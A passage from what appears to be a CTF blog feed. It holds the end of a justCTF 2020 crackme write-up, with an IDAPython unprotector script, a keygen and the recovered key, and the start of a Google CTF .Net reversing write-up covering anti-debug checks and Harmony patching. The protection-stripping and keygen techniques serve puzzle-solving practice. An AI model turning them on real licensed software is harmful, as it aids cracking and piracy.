class="string">&#x27;0x0&#x27;</span>], [<span class="string">&#x27;0xaabb&#x27;</span>, <span class="string">&#x27;0x700000014&#x27;</span>, <span class="string">&#x27;0x8&#x27;</span>, <span class="string">&#x27;0x41&#x27;</span>, <span class="string">&#x27;0x0&#x27;</span>], [<span class="string">&#x27;0xaabb&#x27;</span>, <span class="string">&#x27;0xb00000014&#x27;</span>, <span class="string">&#x27;0x8&#x27;</span>, <span class="string">&#x27;0x42&#x27;</span>, <span class="string">&#x27;0x0&#x27;</span>], [<span class="string">&#x27;0xaabb&#x27;</span>, <span class="string">&#x27;0x1200000014&#x27;</span>, <span class="string">&#x27;0x8&#x27;</span>, <span class="string">&#x27;0x43&#x27;</span>, <span class="string">&#x27;0x0&#x27;</span>], [<span class="string">&#x27;0xaabb&#x27;</span>, <span class="string">&#x27;0x800000014&#x27;</span>, <span class="string">&#x27;0x8&#x27;</span>, <span class="string">&#x27;0x27&#x27;</span>, <span class="string">&#x27;0x0&#x27;</span>], [<span class="string">&#x27;0xaabb&#x27;</span>, <span class="string">&#x27;0xc00000014&#x27;</span>, <span class="string">&#x27;0x8&#x27;</span>, <span class="string">&#x27;0x94&#x27;</span>, <span class="string">&#x27;0x0&#x27;</span>], [<span class="string">&#x27;0x202&#x27;</span>, <span class="string">&#x27;0x700000018&#x27;</span>, <span class="string">&#x27;0x8&#x27;</span>, <span class="string">&#x27;0x41&#x27;</span>, <span class="string">&#x27;0x0&#x27;</span>], [<span class="string">&#x27;0x202&#x27;</span>, <span class="string">&#x27;0x9000000018&#x27;</span>, <span class="string">&#x27;0x8&#x27;</span>, <span class="string">&#x27;0x42&#x27;</span>, <span class="string">&#x27;0x0&#x27;</span>], [<span class="string">&#x27;0x202&#x27;</span>, <span class="string">&#x27;0x11b00000018&#x27;</span>, <span class="string">&#x27;0x8&#x27;</span>, <span class="string">&#x27;0x43&#x27;</span>, <span class="string">&#x27;0x0&#x27;</span>], [<span class="string">&#x27;0x202&#x27;</span>, <span class="string">&#x27;0x4b00000018&#x27;</span>, <span class="string">&#x27;0x8&#x27;</span>, <span class="string">&#x27;0x27&#x27;</span>, <span class="string">&#x27;0x0&#x27;</span>], [<span class="string">&#x27;0x202&#x27;</span>, <span class="string">&#x27;0xd300000018&#x27;</span>, <span class="string">&#x27;0x8&#x27;</span>, <span class="string">&#x27;0x94&#x27;</span>, <span class="string">&#x27;0x0&#x27;</span>], [<span class="string">&#x27;0xabcd&#x27;</span>, <span class="string">&#x27;0x700000018&#x27;</span>, <span class="string">&#x27;0x8&#x27;</span>, <span class="string">&#x27;0x41&#x27;</span>, <span class="string">&#x27;0x0&#x27;</span>], [<span class="string">&#x27;0xabcd&#x27;</span>, <span class="string">&#x27;0x9000000018&#x27;</span>, <span class="string">&#x27;0x8&#x27;</span>, <span class="string">&#x27;0x42&#x27;</span>, <span class="string">&#x27;0x0&#x27;</span>], [<span class="string">&#x27;0xabcd&#x27;</span>, <span class="string">&#x27;0x11c00000018&#x27;</span>, <span class="string">&#x27;0x8&#x27;</span>, <span class="string">&#x27;0x43&#x27;</span>, <span class="string">&#x27;0x0&#x27;</span>], [<span class="string">&#x27;0xabcd&#x27;</span>, <span class="string">&#x27;0x4b00000018&#x27;</span>, <span class="string">&#x27;0x8&#x27;</span>, <span class="string">&#x27;0x27&#x27;</span>, <span class="string">&#x27;0x0&#x27;</span>], [<span class="string">&#x27;0xabcd&#x27;</span>, <span class="string">&#x27;0xd300000018&#x27;</span>, <span class="string">&#x27;0x8&#x27;</span>, <span class="string">&#x27;0x94&#x27;</span>, <span class="string">&#x27;0x0&#x27;</span>], [<span class="string">&#x27;0x1234&#x27;</span>, <span class="string">&#x27;0x700000018&#x27;</span>, <span class="string">&#x27;0x8&#x27;</span>, <span class="string">&#x27;0x41&#x27;</span>, <span class="string">&#x27;0x0&#x27;</span>], [<span class="string">&#x27;0x1234&#x27;</span>, <span class="string">&#x27;0x7700000018&#x27;</span>, <span class="string">&#x27;0x8&#x27;</span>, <span class="string">&#x27;0x42&#x27;</span>, <span class="string">&#x27;0x0&#x27;</span>], [<span class="string">&#x27;0x1234&#x27;</span>, <span class="string">&#x27;0xe900000018&#x27;</span>, <span class="string">&#x27;0x8&#x27;</span>, <span class="string">&#x27;0x43&#x27;</span>, <span class="string">&#x27;0x0&#x27;</span>], [<span class="string">&#x27;0x1234&#x27;</span>, <span class="string">&#x27;0x3e00000018&#x27;</span>, <span class="string">&#x27;0x8&#x27;</span>, <span class="string">&#x27;0x27&#x27;</span>, <span class="string">&#x27;0x0&#x27;</span>], [<span class="string">&#x27;0x1234&#x27;</span>, <span class="string">&#x27;0xad00000018&#x27;</span>, <span class="string">&#x27;0x8&#x27;</span>, <span class="string">&#x27;0x94&#x27;</span>, <span class="string">&#x27;0x0&#x27;</span>], [<span class="string">&#x27;0x301&#x27;</span>, <span class="string">&#x27;0x700000018&#x27;</span>, <span class="string">&#x27;0x8&#x27;</span>, <span class="string">&#x27;0x41&#x27;</span>, <span class="string">&#x27;0x0&#x27;</span>], [<span class="string">&#x27;0x301&#x27;</span>, <span class="string">&#x27;0x7800000018&#x27;</span>, <span class="string">&#x27;0x8&#x27;</span>, <span class="string">&#x27;0x42&#x27;</span>, <span class="string">&#x27;0x0&#x27;</span>], [<span class="string">&#x27;0x301&#x27;</span>, <span class="string">&#x27;0xec00000018&#x27;</span>, <span class="string">&#x27;0x8&#x27;</span>, <span class="string">&#x27;0x43&#x27;</span>, <span class="string">&#x27;0x0&#x27;</span>], [<span class="string">&#x27;0x301&#x27;</span>, <span class="string">&#x27;0x3f00000018&#x27;</span>, <span class="string">&#x27;0x8&#x27;</span>, <span class="string">&#x27;0x27&#x27;</span>, <span class="string">&#x27;0x0&#x27;</span>], [<span class="string">&#x27;0x301&#x27;</span>, <span class="string">&#x27;0xaf00000018&#x27;</span>, <span class="string">&#x27;0x8&#x27;</span>, <span class="string">&#x27;0x94&#x27;</span>, <span class="string">&#x27;0x0&#x27;</span>]]</span><br><span class="line">    dec_key_data = [[<span class="built_in">int</span>(x,<span class="number">16</span>) <span class="keyword">for</span> x <span class="keyword">in</span> lst] <span class="keyword">for</span> lst <span class="keyword">in</span> dec_key_data]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> leetbabe_addr <span class="keyword">in</span> leetbabes:</span><br><span class="line">        feedcode_addr = FindBinary(leetbabe_addr, SEARCH_DOWN , <span class="string">&quot;DE C0 ED FE&quot;</span>)</span><br><span class="line">        deadcode_addr = FindBinary(leetbabe_addr, SEARCH_DOWN , <span class="string">&quot;DE C0 AD DE&quot;</span>)</span><br><span class="line"></span><br><span class="line">        print(<span class="string">&quot;1337BABE @ &quot;</span>+<span class="built_in">hex</span>(leetbabe_addr))</span><br><span class="line">        print(<span class="string">&quot;FEEDC0DE @ &quot;</span>+<span class="built_in">hex</span>(feedcode_addr))</span><br><span class="line">        print(<span class="string">&quot;DEADC0DE @ &quot;</span>+<span class="built_in">hex</span>(deadcode_addr))</span><br><span class="line"></span><br><span class="line">        ref_bytes = Qword(leetbabe_addr+<span class="number">4</span>) &amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> qword <span class="keyword">in</span> dec_key_data:</span><br><span class="line">            <span class="keyword">if</span> qword[<span class="number">0</span>] == ref_bytes:</span><br><span class="line">                patch_addr = leetbabe_addr + <span class="number">4</span> + (qword[<span class="number">1</span>] &amp; <span class="number">0xff</span>) + (qword[<span class="number">1</span>] &gt;&gt; <span class="number">32</span>)</span><br><span class="line">                crackme_bytes = Qword(patch_addr)</span><br><span class="line">                dec_res = decrypt(crackme_bytes, qword)</span><br><span class="line">                print(<span class="string">&quot;Patching &quot;</span> + <span class="built_in">hex</span>(crackme_bytes) + <span class="string">&quot; with &quot;</span> + <span class="built_in">hex</span>(dec_res) + <span class="string">&quot; @ &quot;</span> + <span class="built_in">hex</span>(patch_addr))</span><br><span class="line">                ida_bytes.patch_qword(patch_addr, dec_res)</span><br><span class="line"></span><br><span class="line">        print(<span class="string">&quot;Patching unnecessary code with NOPS :)&quot;</span>)</span><br><span class="line">        ida_bytes.patch_bytes(leetbabe_addr-<span class="number">1</span>, <span class="string">&quot;\x90&quot;</span>*<span class="number">7</span>) <span class="comment"># 0xcc + 1337babe + 2 bytes</span></span><br><span class="line">        ida_bytes.patch_bytes(feedcode_addr, <span class="string">&quot;\x90&quot;</span>*<span class="number">4</span>)   <span class="comment"># feedc0de</span></span><br><span class="line">        ida_bytes.patch_bytes(deadcode_addr-<span class="number">1</span>, <span class="string">&quot;\x90&quot;</span>*<span class="number">5</span>) <span class="comment"># 0xcc + deadc0de</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h1 id="Analysing-Unprotected-Crackme"><a href="#Analysing-Unprotected-Crackme" class="headerlink" title="Analysing Unprotected Crackme"></a>Analysing Unprotected Crackme</h1><p>Lets verify if we have successfully patched it.  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└──╼ $.&#x2F;crackme.enc</span><br><span class="line">Hello there!</span><br><span class="line">Error! https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v&#x3D;Khk6SEQ-K-k</span><br></pre></td></tr></table></figure><p>Clean! We can now start working on the crackme.<br>The crackme looks for a file named <code>secret_key</code>, checks it and then later decryptd the <code>flag.png.enc</code> file with AES.  </p><p><a href="/img/justctf/crackme_main_patched.PNG" title="crackme_main_patched" class="gallery-item"><img src="/img/justctf/crackme_main_patched.PNG" alt="crackme_main_patched"></a></p><p>If there are some errors in file operations we get an error.  </p><p><a href="/img/justctf/fileop.PNG" title="fileop" class="gallery-item"><img src="/img/justctf/fileop.PNG" alt="fileop"></a></p><p>The key checking algorithm is not too complex either.  It looks like it is somewhat similar to a custom binary to decimal conversion algo. It looks for a <code>?</code> that indicates a decimal has been processed. The result is then used as an index to some predefined bytes which it later compares with another index(1-127).  </p><p><a href="/img/justctf/real_key_check.PNG" title="real_key_check" class="gallery-item"><img src="/img/justctf/real_key_check.PNG" alt="real_key_check"></a></p><p>I dumped those bytes and wrote a short keygen script.  </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#empty string =&gt; 0</span></span><br><span class="line">bin_dic = &#123;<span class="number">0</span>:<span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">j = <span class="number">1</span></span><br><span class="line"><span class="comment">#generates all binary strings of n bits</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">7</span>):</span><br><span class="line">    maxint = <span class="built_in">int</span>(<span class="string">&#x27;1&#x27;</span>*n,<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(maxint+<span class="number">1</span>):</span><br><span class="line">        data = (<span class="built_in">bin</span>(i)[<span class="number">2</span>:].rjust(n,<span class="string">&#x27;0&#x27;</span>))</span><br><span class="line">        bin_dic[j] = data</span><br><span class="line">        j+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bin_list = [<span class="number">0x1b</span>, <span class="number">0x59</span>, <span class="number">0x29</span>, <span class="number">0x4c</span>, <span class="number">0x3d</span>, <span class="number">0x6f</span>, <span class="number">0x22</span>, <span class="number">0x7f</span>, <span class="number">0x26</span>, <span class="number">0x1c</span>, <span class="number">0x2c</span>, <span class="number">0x2f</span>, <span class="number">0x07</span>, <span class="number">0x4e</span>, <span class="number">0x17</span>, <span class="number">0x1e</span>, <span class="number">0x61</span>, <span class="number">0x0a</span>, <span class="number">0x53</span>, <span class="number">0x10</span>, <span class="number">0x34</span>, <span class="number">0x65</span>, <span class="number">0x4a</span>, <span class="number">0x42</span>, <span class="number">0x58</span>, <span class="number">0x08</span>, <span class="number">0x1d</span>, <span class="number">0x60</span>, <span class="number">0x33</span>, <span class="number">0x55</span>, <span class="number">0x37</span>, <span class="number">0x44</span>, <span class="number">0x52</span>, <span class="number">0x39</span>, <span class="number">0x2e</span>, <span class="number">0x72</span>, <span class="number">0x0f</span>, <span class="number">0x6e</span>, <span class="number">0x7e</span>, <span class="number">0x3f</span>, <span class="number">0x32</span>, <span class="number">0x47</span>, <span class="number">0x5a</span>, <span class="number">0x13</span>, <span class="number">0x19</span>, <span class="number">0x06</span>, <span class="number">0x7a</span>, <span class="number">0x51</span>, <span class="number">0x18</span>, <span class="number">0x1a</span>, <span class="number">0x63</span>, <span class="number">0x48</span>, <span class="number">0x02</span>, <span class="number">0x77</span>, <span class="number">0x3e</span>, <span class="number">0x54</span>, <span class="number">0x35</span>, <span class="number">0x16</span>, <span class="number">0x04</span>, <span class="number">0x5e</span>, <span class="number">0x4f</span>, <span class="number">0x49</span>, <span class="number">0x30</span>, <span class="number">0x03</span>, <span class="number">0x15</span>, <span class="number">0x71</span>, <span class="number">0x4d</span>, <span class="number">0x11</span>, <span class="number">0x38</span>, <span class="number">0x12</span>, <span class="number">0x05</span>, <span class="number">0x45</span>, <span class="number">0x27</span>, <span class="number">0x68</span>, <span class="number">0x3a</span>, <span class="number">0x75</span>, <span class="number">0x09</span>, <span class="number">0x20</span>, <span class="number">0x01</span>, <span class="number">0x40</span>, <span class="number">0x69</span>, <span class="number">0x23</span>, <span class="number">0x6a</span>, <span class="number">0x3b</span>, <span class="number">0x41</span>, <span class="number">0x5f</span>, <span class="number">0x7b</span>, <span class="number">0x57</span>, <span class="number">0x3c</span>, <span class="number">0x1f</span>, <span class="number">0x66</span>, <span class="number">0x56</span>, <span class="number">0x5c</span>, <span class="number">0x0c</span>, <span class="number">0x36</span>, <span class="number">0x73</span>, <span class="number">0x2d</span>, <span class="number">0x67</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0x4b</span>, <span class="number">0x28</span>, <span class="number">0x76</span>, <span class="number">0x78</span>, <span class="number">0x7d</span>, <span class="number">0x31</span>, <span class="number">0x6d</span>, <span class="number">0x25</span>, <span class="number">0x14</span>, <span class="number">0x74</span>, <span class="number">0x5b</span>, <span class="number">0x6b</span>, <span class="number">0x0d</span>, <span class="number">0x50</span>, <span class="number">0x70</span>, <span class="number">0x64</span>, <span class="number">0x0e</span>, <span class="number">0x62</span>, <span class="number">0x2b</span>, <span class="number">0x0b</span>, <span class="number">0x46</span>, <span class="number">0x2a</span>, <span class="number">0x7c</span>, <span class="number">0x79</span>, <span class="number">0x6c</span>, <span class="number">0x24</span>, <span class="number">0x21</span>]</span><br><span class="line">key = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">128</span>):</span><br><span class="line">    num = bin_list.index(i)</span><br><span class="line">    key += bin_dic[num]+<span class="string">&#x27;?&#x27;</span></span><br><span class="line"></span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">001111?10101?000000?11011?000111?01110?101?1010?001101?0010?111000?011110?110001?110101?00101?0100?000100?000110?01100?101101?000001?11010?111?10001?01101?10010??010?1011?0000?011010?001110?111111?11?010010?111110?101100?001?001001?100110?1?111010?110111?011?100001?00011?100?11111?101010?01001?1101?0101?11001?011111?1111?000101?00010?001011?010100?011001?01?10111?01000?010000?010101?1000?100011?00000?001000?111001?01010?10100?11110?0111?100101?00?000011?110?11101?110010?10000?00001?0011?11000?1110?011100?011000?1001?0?01011?101111?011101?100100?11100?010110?1100?0001?110110?10011?110100?0110?011011?100010?001010?010001?010011?110000?111101?101011?00110?10?110011?000010?00100?100000?101110?001100?100111?10110?101000?111100?01111?010111?111011?101001?00111?000?</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">└──╼ $.&#x2F;crackme.enc</span><br><span class="line">Hello there!</span><br><span class="line">Decoding done!</span><br><span class="line">Check out flag_decoded.png</span><br></pre></td></tr></table></figure><p>And finally we have the flag! 0xCC~0xCC</p><p><a href="/img/justctf/flag_decoded.PNG" title="flag_decoded" class="gallery-item"><img src="/img/justctf/flag_decoded.PNG" alt="flag_decoded"></a></p><hr><p>This was an awesome crackme and can prove a good resource for practicing tooling too..<br>I hope we get to see bl33d1ng edg3 pr0t3c70r v2, the next year! </p><h1 id="Solution-Files"><a href="#Solution-Files" class="headerlink" title="Solution Files"></a>Solution Files</h1><p>You can find the unprotector script along with the idb files on my github here :</p><blockquote><p><a href="https://github.com/mrT4ntr4/Challenge-Solution-Files/tree/master/justCTF_2020_debugme">mrT4ntr4/Challenge-Solution-Files/justCTF_2020_debugme</a></p></blockquote><hr></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content:encoded>
      
      
      <category domain="https://mrt4ntr4.github.io/categories/CTF-Writeups/">CTF Writeups</category>
      
      
      <category domain="https://mrt4ntr4.github.io/tags/writeup/">writeup</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/ctf/">ctf</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/reversing/">reversing</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/protector/">protector</category>
      
      
      <comments>https://mrt4ntr4.github.io/JustCTF-debugme/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Google CTF 2020 [.Net-RE]</title>
      <link>https://mrt4ntr4.github.io/GoogleCTF-dotNet/</link>
      <guid>https://mrt4ntr4.github.io/GoogleCTF-dotNet/</guid>
      <pubDate>Tue, 25 Aug 2020 22:00:00 GMT</pubDate>
      
        
        
      <description>&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p><a href="/img/googlectf/thumb.png" title="banner" class="gallery-item"><img src="/img/googlectf/thumb.png" alt="banner"></a></p><p>I got to know that Google CTF had some interesting rev challs. I was late for it so I didn’t participate in the event with a team and also we aren’t quite active these days.<br>I picked up 2nd least solved reversing challenge ie. .Net. Its an interesting challenge and I learnt a lot from it as well, so it might be a little longer than usual but its worth it in the end.  </p><hr><h1 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h1><blockquote><p>.Net is great, especially because of all its weird features.<br><strong>Download :</strong>   <a href="/files/googlectf/chall.zip"  target="_blank">chall.zip</a>  </p></blockquote><hr><h1 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h1><ul><li><strong>Dynamic Instrumentation using HarmonyLib</strong></li><li><strong>C# &lt;=&gt; Native asm FFI</strong></li><li><strong>IDAPython Scripting to assist in native functions analysis</strong></li><li><strong>Replicate algo in python and then finding a valid solution for it using z3</strong></li></ul><hr><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>The challenge includes two files ie. <code>0Harmony.dll</code> and <code>EKTORPFlagValidator.exe</code>.<br>So the name looks a bit weird. I just googled them and found that <a href="https://github.com/pardeike/Harmony">Harmony</a> is actually a libary for doing some runtime patching stuff in .Net apps.  </p><p>With the help of a sample run, we see that it requires a string of length = 30 and also that it validates a checksum from our input.  </p><p><a href="/img/googlectf/sample_run.PNG" title="sample_run" class="gallery-item"><img src="/img/googlectf/sample_run.PNG" alt="sample_run"></a>  </p><hr><h1 id="Static-Analysis"><a href="#Static-Analysis" class="headerlink" title="Static Analysis"></a>Static Analysis</h1><p>So lets start at the entrypoint. And yeah at first I tried to analyse the constructor too but it looked kinda hard to understand statically and I left it for debugging at last.  </p><p><a href="/img/googlectf/entrypoint.PNG" title="entrypoint" class="gallery-item"><img src="/img/googlectf/entrypoint.PNG" alt="entrypoint"></a>  </p><p>So there is this main method which later calls LaunchGui() and as a result we are now in KVOT class.  </p><p><a href="/img/googlectf/main.PNG"><a href="/img/googlectf/main.PNG" title="main" class="gallery-item"><img src="/img/googlectf/main.PNG" alt="main"></a></a>  </p><p><a href="/img/googlectf/launchgui.PNG"><a href="/img/googlectf/launchgui.PNG" title="launchgui" class="gallery-item"><img src="/img/googlectf/launchgui.PNG" alt="launchgui"></a></a>  </p><p>Now we are inside KVOT and it looks like method names are weird.  </p><p><a href="/img/googlectf/kvot.PNG"><a href="/img/googlectf/kvot.PNG" title="kvot" class="gallery-item"><img src="/img/googlectf/kvot.PNG" alt="kvot"></a></a>  </p><p>After the basic initialization part for the GUI there is an event handler <code>submit_button_Click()</code> which looks exactly how we want it to be.  </p><p><a href="/img/googlectf/submit.PNG"><a href="/img/googlectf/submit.PNG" title="submit" class="gallery-item"><img src="/img/googlectf/submit.PNG" alt="submit"></a></a>  </p><p>Ahmmm It does the string length check here, and if it succeeds then call another method with our input string as an argument to <code>SOCKERBIT.GRUNDTAL_NORRVIKEN</code> which returns a list.<br>Also after that it does a basic check that the elements of the returned list are all less than 63 which looks like a character range check from the failure string.  </p><p><a href="/img/googlectf/main_check1.PNG"><a href="/img/googlectf/main_check1.PNG" title="main_check1" class="gallery-item"><img src="/img/googlectf/main_check1.PNG" alt="main_check1"></a></a>  </p><p>And yeah, There is more to it, just hold up.<br><code>GRUNDTAL_NORRVIKEN</code> then calls <code>DecodeBase64Bytewise</code> on each of the element of our string.  </p><p><a href="/img/googlectf/enc_char.PNG"><a href="/img/googlectf/enc_char.PNG" title="enc_char" class="gallery-item"><img src="/img/googlectf/enc_char.PNG" alt="enc_char"></a></a>  </p><p>Hmm, now it gets weird… the <code>DecodeBase64Bytewise</code> method looks like it is trying to instead encode our input and also it checks some conditions which would never return true except the <code>123(&#39;&#123;&#39;)</code> and <code>125(&#39;&#125;&#39;)</code> check.  </p><p><a href="/img/googlectf/decodebase64bytewise.PNG"><a href="/img/googlectf/decodebase64bytewise.PNG" title="decodebase64bytewise" class="gallery-item"><img src="/img/googlectf/decodebase64bytewise.PNG" alt="decodebase64bytewise"></a></a>  </p><p>That means if we input some lowercase characters which should be valid, then it’ll just return a list of 30 -1’s. </p><a href="https://media.giphy.com/media/oOTTyHRHj0HYY/giphy.gif" title="drawing" class="gallery-item"><img src="https://media.giphy.com/media/oOTTyHRHj0HYY/giphy.gif" alt="drawing" width="300"/></a>  <p>But the signness trick here casts it to an unsigned integer.<br>Something like this :  </p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((uint)(<span class="built_in">byte</span>)(arg + <span class="number">191</span>) &lt;= <span class="number">25u</span>)</span><br><span class="line">&#123;</span><br><span class="line">  Console.WriteLine((uint)(<span class="built_in">byte</span>)(arg + <span class="number">191</span>));  <span class="comment">// overflows  </span></span><br><span class="line">  <span class="keyword">return</span> (<span class="built_in">sbyte</span>)(arg - <span class="number">55</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>For eg. ‘H’(72) fulfills the above condition since <code>(byte)(72+191)</code> is 7 when cast to a byte and not 263.  </p><p>This is the 2nd part of the check routine with methods <code>DAGSTORP</code>, <code>SMORBOLL</code> and <code>HEROISK</code>.<br>A list is initialized and passed to <code>DAGSTORP</code> along with our encrypted input.  </p><p><a href="/img/googlectf/main_check2.PNG"><a href="/img/googlectf/main_check2.PNG" title="main_check2" class="gallery-item"><img src="/img/googlectf/main_check2.PNG" alt="main_check2"></a></a>  </p><p>Ahh, It just looks like a simple xor, ezpz!</p><p><a href="/img/googlectf/list_xor.PNG"><a href="/img/googlectf/list_xor.PNG" title="list_xor" class="gallery-item"><img src="/img/googlectf/list_xor.PNG" alt="list_xor"></a></a>  </p><p>Then there is this checksum as you’ve guessed it from the failure string. It calculates the checksum on the basis that it does different calculations according to the index value.<br>The index value checks are just for checking whether the index is divisible by 2,3,5 or 7 and FYI, it doesn’t include the index 28 as it is later compared with the final checksum value.  </p><p><a href="/img/googlectf/checksum.PNG"><a href="/img/googlectf/checksum.PNG" title="checksum" class="gallery-item"><img src="/img/googlectf/checksum.PNG" alt="checksum"></a></a>  </p><p>And then there is method <code>VAXMYRA</code> which just checks if there are any duplicates in the encrypted array.  </p><p><a href="/img/googlectf/vaxmyra.PNG"><a href="/img/googlectf/vaxmyra.PNG" title="vaxmyra" class="gallery-item"><img src="/img/googlectf/vaxmyra.PNG" alt="vaxmyra"></a></a>  </p><p>And after bypassing through the checksum validation and <code>VAXMYRA</code> we get to the main condition checks that validates our encrypted input. And Yes, I smell z3!  </p><p><a href="/img/googlectf/final_conds.PNG"><a href="/img/googlectf/final_conds.PNG" title="final_conds" class="gallery-item"><img src="/img/googlectf/final_conds.PNG" alt="final_conds"></a></a>  </p><hr><h1 id="Dynamic-Analysis"><a href="#Dynamic-Analysis" class="headerlink" title="Dynamic Analysis"></a>Dynamic Analysis</h1><p>Getting to the main fun part ie. debugging it in dnsPy.<br>Huh wait a sec where is FYRKANTIG. Instead we get redirected to NUFFRA and now it looks more complicated and gibberish to deal with.</p><p><a href="/img/googlectf/nuffra.PNG"><a href="/img/googlectf/nuffra.PNG" title="nuffra" class="gallery-item"><img src="/img/googlectf/nuffra.PNG" alt="nuffra"></a></a>  </p><p>So to explain this inner magic and so called weirdness we’ll have to debug right from the constructor. If you’d traced the execution accurately, you’ll find that there is a <a href="https://docs.microsoft.com/en-us/dotnet/api/system.reflection.emit.opcodes.calli?view=netcore-3.1">calli</a> instruction which calls a method by specifying its address as an argument.  </p><p><a href="/img/googlectf/calli.PNG"><a href="/img/googlectf/calli.PNG" title="calli" class="gallery-item"><img src="/img/googlectf/calli.PNG" alt="calli"></a></a>  </p><p>I noticed that it calls several functions and just noted down the method addresses ie. from <code>num</code> variable.  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x600003B</span>   <span class="comment"># Debugger.IsAttached() check (native)</span></span><br><span class="line"><span class="number">0x600003D</span></span><br><span class="line"><span class="number">0x6000046</span>   <span class="comment"># patch functions routine (native)</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x60000D6</span></span><br><span class="line"><span class="number">0x60000D7</span></span><br><span class="line"><span class="number">0x60000D8</span></span><br><span class="line"><span class="number">0x60000D9</span>   <span class="comment"># we don&#x27;t care about the 0xD6-0xDC functions</span></span><br><span class="line"><span class="number">0x60000DA</span></span><br><span class="line"><span class="number">0x60000DB</span></span><br><span class="line"><span class="number">0x60000DC</span></span><br></pre></td></tr></table></figure><p>0x600003B has a simple anti-debug check with <code>System.Diagnostics.Debugger.IsAttached</code>!  </p><p><a href="/img/googlectf/is_debugger_attached.PNG"><a href="/img/googlectf/is_debugger_attached.PNG" title="is_debugger_attached" class="gallery-item"><img src="/img/googlectf/is_debugger_attached.PNG" alt="is_debugger_attached"></a></a>  </p><p>0x6000046 is the magic method here which in turn calls another native function.  </p><p><a href="/img/googlectf/harmony_caller.PNG"><a href="/img/googlectf/harmony_caller.PNG" title="harmony_caller" class="gallery-item"><img src="/img/googlectf/harmony_caller.PNG" alt="harmony_caller"></a></a>  </p><p>That native function has another anti-debug technique implemented ie <code>kernel32.dll::IsDebuggerPresent</code> and if it is true it returns 1 which eventually doesn’t do anything and the latter will call a c# method which is indeed responsible for changing the methods.  </p><p><a href="/img/googlectf/debugger_check1.PNG"><a href="/img/googlectf/debugger_check1.PNG" title="debugger_check1" class="gallery-item"><img src="/img/googlectf/debugger_check1.PNG" alt="debugger_check1"></a></a>  </p><p>And Fortunately it happens that dnsPy has got us covered and was successful in deafeating those anti-debug techniques like a ninja. All thanks to this <a href="https://github.com/0xd4d/dnSpy/issues/288">issue</a>  </p><h2 id="Harmony-Magic"><a href="#Harmony-Magic" class="headerlink" title="Harmony Magic"></a>Harmony Magic</h2><p>So this is the function called if the isDebuggerPresent returns false and it looks like it is patching the original methods we found during the static analysis to some other methods.  </p><p><a href="/img/googlectf/patched_fcns.PNG"><a href="/img/googlectf/patched_fcns.PNG" title="patched_fcns" class="gallery-item"><img src="/img/googlectf/patched_fcns.PNG" alt="patched_fcns"></a></a>  </p><h3 id="How-Harmony-works"><a href="#How-Harmony-works" class="headerlink" title="How Harmony works"></a>How Harmony works</h3><p>Harmony <a href="https://harmony.pardeike.net/articles/intro.html">docs</a> explains it better but basically here it just patches a method body at runtime.  </p><p><strong>From docs :</strong><br>Where other patch libraries simply allow you to replace the original 